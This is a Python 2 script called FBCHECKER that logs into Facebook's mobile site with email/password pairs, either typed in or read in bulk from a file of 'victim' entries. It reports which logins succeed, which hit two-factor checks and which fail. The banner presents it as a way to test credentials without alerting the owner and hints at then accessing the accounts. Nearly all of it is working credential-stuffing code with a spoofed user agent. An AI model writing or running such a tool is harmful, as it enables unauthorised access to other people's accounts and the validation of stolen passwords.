#!/usr/bin/python
import mechanize
import cookielib
import urllib2
import urllib
import os
import getpass
import csv
import numpy as np

print '|************************WELCOME TO FBCHECKER***************************************|'
print '|This program only does the check of the credential of Facebook Accounts.           |'
print '|If you want to know if a pair of email/password is valid you can check without     |'
print '|enter in the account and so without warning the owner                              |'
print '|***********************************************************************************|'
print '|Remember that most of accounts require double-auth, if you are lucky you can access|'
print '|to te account after check. To know if the account is affected by double-auth       |'
print '|just open the HTML-OUTPUT and see at the page                                      |'
print '|********************************************************************************** |'
print '|___________________________DON''T BE MALICIOUS  ;)___________________________________|'
print '|*******The aim of this program is only to CHECK, it is not thinked as a thread*****|'
print '|                                                                                   |'
print '|___________All credits reserved to mattiaquadrini@gmail.com________________________|'
print ''
#Begin
retry = 'y'
#try:
while retry=='y':
	#Welcome
	print '	Welcome, type a choice:'
	print ''
	print '	(1) Manual Insertion'
	print '	(2) Import files'
	print ''
	tp = int(raw_input('Type > '))

	#Different paths
	if tp==1:
		#Data Manual Insert
		print ''
		print '(1) Insert the email of the owner'
		user = raw_input('EMAIL: ')
		print '(2) Insert the password of the owner'
		passwd = getpass.getpass('PASSWORD: ').decode('unicode_escape')
		#Browser
		br = mechanize.Browser()
		# Cookie Jar
		cj = cookielib.LWPCookieJar()
		br.set_cookiejar(cj)
		# Browser optionsbr.set_handle_equiv(True)
		br.set_handle_gzip(True)
		br.set_handle_redirect(True)
		br.set_handle_referer(True)
		br.set_handle_robots(False)
		# Follows refresh 0 but not hangs on refresh >
		br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
		# Want debugging messages?
		#br.set_debug_http(True)
		#br.set_debug_redirects(True)
		#br.set_debug_responses(True)
		# User-Agent (this is cheating, ok?)
		br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
		#"Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13")]
		#Login
		br.open('http://m.facebook.com/')
		intitle = br.title()
		br.select_form(nr=0)
		br.form['email'] = user
		br.form['pass'] = passwd
		br.submit()
		r = br.response()
		#Dump on a file
		fileobj = open("HTML-OUTPUT.html","wb")
		fileobj.write(r.read())
		fileobj.close()
		#Result
		outurl = r.geturl()
		outtitle = br.title()
		print '*******************************************************************************************'
		print 'TITLE PAGE BEFORE LOGIN: '+'('+intitle+')'
		print 'TITLE PAGE AFTER LOGIN: '+'('+outtitle+')'
		print '*******************************************************************************************'
		print 'URL AFTER LOGIN'+'('+outurl+')'
		print '*******************************************************************************************'
		if outurl=='https://m.facebook.com/checkpoint/?refid=8&_rdr' and outtitle=='Inserisci un codice di accesso per continuare':
			print 'CHECK RESPONSE: CORRECT LOGIN (DOUBLE-AUTH)'
			print '*******************************************'
			print '*******************          **************'
			print '*****************   ***********************'
			print '****************   ************************'
			print '****************   ************************'
			print '****************   ************************'
			print '****************          *****************'
			print '****************   ************************'
			print '****************   ************************'
			print '****************   ************************'
			print '****************   ************************'
			print '****************   ************************'
			print '*******************************************'
		if outurl=='https://m.facebook.com/login/save-device/?login_source=login&refsrc=https%3A%2F%2Fm.facebook.com%2F&refid=8&_rdr#_=_' and outtitle=='Facebook':
			print 'CHECK RESPONSE: CORRECT LOGIN '
			print '*******************************************'
			print '*******************************************'
			print '*******************          **************'
			print '*****************   ***********************'
			print '****************   ************************'
			print '****************   ************************'
			print '****************   ************************'
			print '****************          *****************'
			print '****************   ************************'
			print '****************   ************************'
			print '****************   ************************'
			print '****************   ************************'
			print '****************   ************************'
			print '****************   ************************'
			print '*******************************************'

		if outurl!='https://m.facebook.com/checkpoint/?refid=8&_rdr' and outurl!='https://m.facebook.com/login/save-device/?login_source=login&refsrc=https%3A%2F%2Fm.facebook.com%2F&refid=8&_rdr#_=_':
			print 'CHECK RESPONSE: BAD LOGIN'
			print '*******************************************'
			print '*******************************************'
			print '****      *********************      ******'
			print '*******      ***************      *********'
			print '**********      *********      ************'
			print '*************               ***************'
			print '****************   ***   ******************'
			print '****************   ***   ******************'
			print '*************             *****************'
			print '**********       *******      *************'
			print '*******      *************      ***********'
			print '****      *******************      ********'
			print '*******************************************'
			print '*******************************************'

	if tp==2:
		#Data Import
		victim=[]
		FILE = raw_input('Name of the file > ')
		victim=np.genfromtxt(FILE,delimiter=';',dtype=None)
	    #Browser
		br = mechanize.Browser()
	    #Cookie Jar
		cj = cookielib.LWPCookieJar()
		br.set_cookiejar(cj)
	    #Browser options
		br.set_handle_equiv(True)
		br.set_handle_gzip(True)
		br.set_handle_redirect(True)
		br.set_handle_referer(True)
		br.set_handle_robots(False)
		# Follows refresh 0 but not hangs on refresh > 0
		br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
		# Want debugging messages?
		#br.set_debug_http(True)
        #br.set_debug_redirects(True)
        #br.set_debug_responses(True)
        # User-Agent (this is cheating, ok?)
		br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
		#"Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13")]
		#Login
		for i in range(0,victim.__len__()-1):
                        br.open('http://m.facebook.com/')
                        intitle = br.title()
                        br.select_form(nr=0)
                        br.form['email'] = victim[i][0]
                        br.form['pass'] = victim[i][1]
                        br.submit()
                        r = br.response()
			#Dump on a file
			fileobj = open("HTML-OUTPUT"+'('+str(i)+')'+".html","wb")
			fileobj.write(r.read())
			fileobj.close()
                        #Result
			outurl = r.geturl()
			outtitle = br.title()
			print '*******************************************************************************************'
			print 'TITLE PAGE BEFORE LOGIN: '+'('+intitle+')'
			print 'TITLE PAGE AFTER LOGIN: '+'('+outtitle+')'
			print '*******************************************************************************************'
			print 'URL AFTER LOGIN'+'('+outurl+')'
			print '*******************************************************************************************'
			#br.close()
			#if outurl=='https://m.facebook.com/checkpoint/?refid=8&_rdr' and outtitle=='Inserisci un codice di accesso per continuare':
			#	print (victim[i]+' : '+'CHECK RESPONSE: CORRECT LOGIN DOUBLE-AUTH')
                        #if outurl=="https://m.facebook.com/login/save-device/?login_source=login&refsrc=https%3A%2F%2Fm.facebook.com%2F&refid=8&_rdr#_=_":
                        #        print (victim[i]+' : '+'CHECK RESPONSE: CORRECT LOGIN ')
                        #if outurl!='https://m.facebook.com/checkpoint/?refid=8&_rdr' and outurl!='https://m.facebook.com/login/save-device/?login_source=login&refsrc=https%3A%2F%2Fm.facebook.com%2F&refid=8&_rdr#_=_':
                        #        print (victim[i]+' : '+'CHECK RESPONSE: BAD LOGIN')
	retry = raw_input('Retry? (y/n) : ')

	#except Exception:
	#	raw_input('Something goes wrong...')

	#DETAILS and COMMENTS about mechanize

	# Show the source

	#print html

	# or

	#print br.response().read()

	# Show the html title

	#print br.title()

	# Show the response headers

	#print r.info()

	# or

	#print br.response().info()
